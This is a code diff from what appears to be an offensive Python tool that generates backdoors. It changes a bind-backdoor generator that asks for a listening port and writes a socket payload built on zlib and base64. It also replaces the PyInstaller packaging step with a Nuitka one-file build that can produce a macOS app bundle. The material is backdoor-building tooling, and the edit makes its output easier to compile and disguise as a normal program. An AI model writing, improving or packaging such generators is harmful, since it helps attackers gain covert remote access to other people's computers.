@@ -209,7 +209,7 @@ def gen_bind():
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
     bind = '1'
     with open(name, 'a+') as ina:
-        ina.write('port = '+str(port))
+        ina.write('port = '+str(port)+'\n')
         a = '''
 import zlib,base64,socket,struct,time
 def main():
@@ -382,11 +382,11 @@ def postgen():
     compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
     if compiling == 'y':
         if encrypted == True:
-            compcomd = 'pyinstaller --key '+b+' -F --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name+'_or.py'
+            compcomd = 'python3 -m nuitka --standalone --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name+'_or.py'
             os.system(compcomd)
             print('Saved under "dist" folder')
         else:
-            compcomd = 'pyinstaller --key '+b+' -F --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name
+            compcomd = 'python3 -m nuitka --standalone --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name
             os.system(compcomd)
             os.system(clear)
             print(logo)
